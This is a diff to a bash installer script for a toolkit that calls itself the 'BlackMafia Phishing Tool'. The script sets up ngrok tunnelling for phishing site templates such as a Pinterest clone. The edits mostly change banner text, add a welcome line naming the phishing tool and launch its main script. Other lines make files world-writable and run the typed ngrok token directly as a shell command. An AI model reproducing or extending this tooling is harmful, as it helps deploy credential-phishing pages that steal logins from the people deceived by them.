@@ -5,7 +5,7 @@ echo ""
 echo ""
 echo ""
 echo ""
-echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m!!! DUDE PLEASE ENTER NGROK !!! \e[0m'
+echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m!!! Ngrok Installation Plz Wi8 !!! \e[0m'
 sleep 2
 clear
 echo ""
@@ -66,14 +66,15 @@ cp -R ngrok BlackMafiaLovehacker Sites/pinterest/
 chmod 7777 BlackMafia.sh
 clear
 echo ""
-echo -e $'\e[1;91m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;91m KEEP IN MIND YOU HAVE TO ENTER  \e[1;33m[ *** ]\e[0m'
+echo -e $'\e[1;91m[\e[0m\e[1;33m ⛔ \e[0m\e[1;96m]\e[0m\e[1;92m ⛔Enter The Ngrok Token  \e[1;33m[ *** ]\e[0m'
 echo ""
-read -p $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+read -p $'\e[1;91m[\e[0m\e[1;77m⛔\e[0m\e[1;91m]\e[0m\e[1;95m [➡️https://ngrok.com/⬅️\e[0m\e[1;92mlogin & Copy Token Paste here➡️] : \e[0m' token
 $token
 sleep2
 clear
-echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
-echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
-echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;95m   -------------------------------------- \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!       Installation Successfull       !!  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !! WellCome To BlackMafia Phishing Tool !!  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;95m   -------------------------------------- \e[1;91m\e[0m'
 sleep 4
-clear
+./BlackMafia.sh
